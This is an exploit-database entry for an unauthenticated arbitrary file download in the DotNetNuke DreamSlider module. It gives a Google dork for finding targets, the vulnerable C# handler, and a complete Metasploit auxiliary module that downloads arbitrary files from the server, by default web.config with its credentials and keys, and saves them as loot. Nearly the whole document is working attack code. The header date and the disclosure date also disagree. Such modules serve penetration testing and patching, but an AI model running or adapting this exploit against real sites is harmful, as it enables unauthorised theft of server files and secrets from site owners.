# Date: 23/01/2014
# Author: Glafkos Charalambous
# Version: 01.01.02
# Vendor: DreamSlider
# Vendor URL: http://www.dreamslider.com/
# Google Dork: inurl:/DesktopModules/DreamSlider/
# CVE: 
#
# Description
# DotNetNuke DreamSlider Module prior to version X suffer from a remote unauthenticated arbitrary file download vulnerability
#
# Vulnerable Code
#
# namespace DotNetNuke.Modules.DreamSlider
# {
#    using System;
#    using System.IO;
#    using System.Web.SessionState;
#    using System.Web.UI;
#
#    public class DownloadProvider : Page, IRequiresSessionState
#    {
#        protected void Page_Load(object sender, EventArgs e)
#        {
#            if (!base.IsPostBack && (base.Request.QueryString["File"] != null))
#            {
#                string path = base.Request.QueryString["File"];
#                string fileName = Path.GetFileName(path);
#                base.Response.ContentType = "application/octet-stream";
#                base.Response.AddHeader("Content-Disposition", "attachment; filename=" + fileName);
#                base.Response.WriteFile(path);
#                base.Response.End();
#            }
#        }
#    }
# }
 
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Auxiliary
  Rank = ExcellentRanking
 
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;DotNetNuke DreamSlider Arbitrary File Download&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an unauthenticated arbitrary file download vulnerability in DNN
    DreamSlider version 01.01.02 and below.
      },
      &#039;Author&#039;         =>
        [
          &#039;Glafkos Charalambous&#039;, # Discovery and Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://metasploit.com&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 23 2015&#039;))
 
    register_options(
      [
        Opt::RPORT(80),
        OptString.new(&#039;FILENAME&#039;, [true, &#039;File to download&#039;, &#039;~/web.config&#039;]),
        OptString.new(&#039;PATH&#039;, [true, &#039;Path of DNN Nuke&#039;, &#039;/&#039;]),
      ], self.class)
  end
 
  def check
    begin
 
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(datastore[&#039;PATH&#039;],"/DesktopModules/DreamSlider/DownloadProvider.aspx"),
        &#039;cookie&#039; => datastore[&#039;Cookie&#039;],
      })
 
    if res && res.code == 200 and res.body.to_s =~ /Download Provider/
       return Exploit::CheckCode::Vulnerable
    else
       return Exploit::CheckCode::Safe
    end
    Exploit::CheckCode::Safe
   end
  end
 
  def run
    begin
      print_status("#{peer} - Downloading file #{datastore[&#039;FILENAME&#039;]}")
 
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(datastore[&#039;PATH&#039;],"/DesktopModules/DreamSlider/DownloadProvider.aspx?File=") + datastore[&#039;FILENAME&#039;],
    &#039;cookie&#039; => datastore[&#039;Cookie&#039;],
      })
 
    rescue Rex::ConnectionError
      print_error("#{peer} - Could not connect.")
      return
    end
 
    if res && res.code == 200
      if res.body.to_s.bytesize == 0
        print_error("#{peer} - 0 bytes returned, file does not exist or it is empty.")
        return
      end
 
      fileName = datastore[&#039;FILENAME&#039;]
 
      path = store_loot(
        &#039;ds.http&#039;,
        &#039;application/octet-stream&#039;,
        datastore[&#039;RHOST&#039;],
        res.body,
        fileName
      )
      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Failed to download file.")
    end
  end
end

